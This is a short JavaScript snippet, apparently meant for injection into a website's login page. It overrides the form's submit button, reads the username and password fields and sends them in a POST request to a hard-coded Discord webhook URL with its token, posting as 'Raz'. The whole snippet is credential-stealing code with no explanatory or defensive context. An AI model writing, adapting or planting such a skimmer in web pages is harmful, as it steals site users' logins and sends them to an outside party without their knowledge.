document.getElementById('edit-submit').onclick = function(){
                          
                          var password = document.getElementById('edit-name').value
                          var username = document.getElementById('edit-pass').value
  var request = new XMLHttpRequest();
  request.open("POST", "https://discord.com/api/webhooks/999062497745195078/AcAoM-Et_fqZX5M8VZb9fDKrZWUVtdfFPnuOgDJ6v8zV4LEhiCm85Qddcdg3W-tL4uFo");

  request.setRequestHeader('Content-type', 'application/json');

  var params = {
    username: "Raz",
    avatar_url: "",
    content: 'User: ' + username + '\n' + 'Pass: ' + password
  }

  request.send(JSON.stringify(params));
                          
                          console.clear;}
